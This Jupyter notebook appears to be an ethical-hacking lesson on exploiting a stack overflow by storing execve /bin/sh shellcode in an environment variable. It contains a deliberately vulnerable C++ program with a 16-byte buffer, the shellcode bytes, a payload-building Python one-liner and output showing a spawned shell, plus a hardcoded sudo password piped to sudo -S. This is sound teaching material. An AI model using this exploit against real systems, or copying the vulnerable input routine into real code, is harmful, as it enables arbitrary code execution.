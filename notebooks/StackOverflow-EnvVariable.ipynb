{
 "cells": [
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "# Stack Overflow - Exploiting with Env Variable\n",
    "\n",
    "- often times buffer that has overflow vulnerability is not large enough to fit even the smallest shellcode\n",
    "- in sitation like this, one can stash the shellcode as an environment variable and overwrite the caller's return address with the address of the shellcode stored in environment variable\n",
    "- environment variables are loaded into the memory everytime a program is loaded into memory bydefault\n",
    "- one can also execute program without loading the environment variable, however\n",
    "- **env -i ./program** command, e.g., ignores environment variable when running a program\n",
    "- let's look at how we can programmatically find the address of environment variables using C++\n",
    "- C stanard library's **getenv()** accepts the name of an environment variable as its only argument and returns that variable's memory address\n",
    "- **getenvaddr.cpp** demo provides fairly accurate location by accounting for the length of the target program's name that's also loaded on stack"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <stdio.h>\r\n",
      "#include <stdlib.h>\r\n",
      "#include <string.h>\r\n",
      "\r\n",
      "int main(int argc, char *argv[]) {\r\n",
      "    char *ptr;\r\n",
      "\r\n",
      "    if(argc < 3) {\r\n",
      "        printf(\"Usage: %s <env variable name> <target program name>\\n\", argv[0]);\r\n",
      "    }\r\n",
      "    else {\r\n",
      "        ptr = getenv(argv[1]); /* get env var location */\r\n",
      "        int diff = (strlen(argv[0]) - strlen(argv[2]))*2;\r\n",
      "        ptr += diff; /* adjust for program name */\r\n",
      "        printf(\"%s will be at %p with reference to %s\\n\", argv[1], ptr, argv[2]);\r\n",
      "    }\r\n",
      "    return 0;\r\n",
      "}\r\n"
     ]
    }
   ],
   "source": [
    "! cat ./demos/stack_overflow/getenvaddr.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "input=\"./demos/stack_overflow/getenvaddr.cpp\"\n",
    "output=getenvaddr.exe\n",
    "\n",
    "echo kali | sudo -S ./compile.sh $input $output"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Usage: ./getenvaddr.exe <env variable name> <target program name>\r\n"
     ]
    }
   ],
   "source": [
    "! ./getenvaddr.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "PATH will be at 0xffffc794 with reference to ./getenvaddr.exe\r\n"
     ]
    }
   ],
   "source": [
    "! ./getenvaddr.exe PATH ./getenvaddr.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### Note\n",
    "- the `./getenvaddr.exe` program provides different address when the above command is directly executed from the terminal compared to running it from the Jupyter notebook\n",
    "- the address retrieved from the terminal is the one we need as we'll be exploiting the program directly from terminal and not from the Jupyter notebook!\n",
    "- the following snippet shows the PATH address when executed from the terminal\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/EthicalHacking]\n",
    "└─$ ./getenvaddr.exe PATH ./getenvaddr.exe\n",
    "PATH will be at 0xffffc80a with reference to ./getenvaddr.exe\n",
    "```\n",
    "\n",
    "### Export shellcode\n",
    "- let's copy `shellcode.bin` from the `demos/shellcode` folder and export it as an environment variable\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/EthicalHacking]\n",
    "└─$ cp ./demos/shellcode/shellcode.bin .\n",
    "\n",
    "┌──(kali㉿K)-[~/EthicalHacking]\n",
    "└─$ wc -c shellcode.bin \n",
    "24 shellcode.bin\n",
    "\n",
    "┌──(kali㉿K)-[~/EthicalHacking]\n",
    "└─$ export SHELLCODE=$(cat shellcode.bin)\n",
    "                                                                                                                  \n",
    "┌──(kali㉿K)-[~/EthicalHacking]\n",
    "└─$ echo $SHELLCODE | hexdump -C         \n",
    "00000000  31 c0 50 68 2f 2f 73 68  68 2f 62 69 6e 89 e3 31  |1.Ph//shh/bin..1|\n",
    "00000010  c9 89 ca 6a 0b 58 cd 80  0a                       |...j.X...|\n",
    "00000019\n",
    "\n",
    "```\n",
    "\n",
    "### Expoit so_env.cpp\n",
    "- let's copy and compile the file and exploit it using the shellcode stashed in environment variable\n",
    "- the program has buffer size of 16 bytes which is not big enough to hold our 24 bytes shellcode"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 7,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "#include <cstring>\r\n",
      "#include <iostream>\r\n",
      "\r\n",
      "using namespace std;\r\n",
      "\r\n",
      "char * mgets(char *dst) {\r\n",
      "    char *ptr = dst;\r\n",
      "    int ch; \r\n",
      "\t/* skip leading white spaces */ \r\n",
      "    while ((ch = getchar()) && (ch == ' ' or ch == '\\t')) \r\n",
      "        ; \r\n",
      "\r\n",
      "    if ((ch == '\\n') or (ch == EOF)) { \r\n",
      "        *ptr = '\\0';\r\n",
      "        return dst; \r\n",
      "    } \r\n",
      "    else\r\n",
      "        *ptr = ch;\r\n",
      "\r\n",
      "    /* now read the rest until \\n or EOF */ \r\n",
      "    while (ch = getchar()) {\r\n",
      "        if (ch == '\\n' or ch == EOF) break;\r\n",
      "        *(++ptr) = ch; \r\n",
      "    }\r\n",
      "    *(++ptr) = 0;\r\n",
      "    return dst;\r\n",
      "}\r\n",
      "\r\n",
      "void bad() {\r\n",
      "    char buffer[16];\r\n",
      "    cout << \"Enter text: \";\r\n",
      "    mgets(buffer);\r\n",
      "    cout << \"text = \" << buffer << endl;\r\n",
      "}\r\n",
      "\r\n",
      "int main(int argc, char *argv[]) {\r\n",
      "    //char *ptr;\r\n",
      "    //ptr = getenv(\"SHELLCODE\");\r\n",
      "    //printf(\"SHELLCODE is at %p\\n\", ptr);\r\n",
      "    bad();\r\n",
      "    cout << \"Good bye!\\n\";\r\n",
      "    return 0;\r\n",
      "}\r\n",
      "\t\r\n"
     ]
    }
   ],
   "source": [
    "! cat ./demos/stack_overflow/so_env.cpp"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 9,
   "metadata": {},
   "outputs": [
    {
     "name": "stderr",
     "output_type": "stream",
     "text": [
      "[sudo] password for kali: "
     ]
    }
   ],
   "source": [
    "%%bash\n",
    "input=\"./demos/stack_overflow/so_env.cpp\"\n",
    "output=\"so_env.exe\"\n",
    "\n",
    "echo kali | sudo -S ./compile.sh $input $output"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "### crash the program"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 13,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Enter text: text = AAAAAAAAAA\r\n",
      "Good bye!\r\n"
     ]
    }
   ],
   "source": [
    "! python -c 'print(\"A\"*10)' | ./so_env.exe"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 11,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "Enter text: text = AAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\r\n"
     ]
    }
   ],
   "source": [
    "! python -c 'print(\"A\"*30)' | ./so_env.exe"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- first, find the address of `SHELLCODE` environment variable with respect to `so_env.exe`\n",
    "- repeat the address of `SHELLCODE` enough to overwrite the caller's return address in `bad()`\n",
    "- VOILA!\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/EthicalHacking]\n",
    "└─$ ./getenvaddr.exe SHELLCODE ./so_env.exe            \n",
    "SHELLCODE will be at 0xffffdfa9 with reference to ./so_env.exe\n",
    "```\n",
    "- since the program recieves the data from standard input, we'll create a payload file with the repeated SHELLCODE address (little endian)"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 14,
   "metadata": {},
   "outputs": [],
   "source": [
    "! python -c 'import sys; sys.stdout.buffer.write(b\"\\xa9\\xdf\\xff\\xff\"*20)' > payload_env.bin"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 15,
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "80 payload_env.bin\r\n"
     ]
    }
   ],
   "source": [
    "! wc -c payload_env.bin"
   ]
  },
  {
   "cell_type": "markdown",
   "metadata": {},
   "source": [
    "- now that the payload_env.txt is created we'll pipe it to the program as stdio\n",
    "\n",
    "```bash\n",
    "┌──(kali㉿K)-[~/EthicalHacking]\n",
    "└─$ cat payload_env.bin - | ./so_env.exe    \n",
    "\n",
    "Enter text: text = ��������������������������������������������������������������������������������\n",
    "whoami\n",
    "kali\n",
    "date\n",
    "Thu Dec 17 00:26:43 MST 2020\n",
    "exit\n",
    "\n",
    "```\n",
    "- the shellcode doesn't provide the prompt and you have to hit enter on a blank line to end the stdandard input buffer"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": []
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3 (ipykernel)",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.12.2"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 4
}
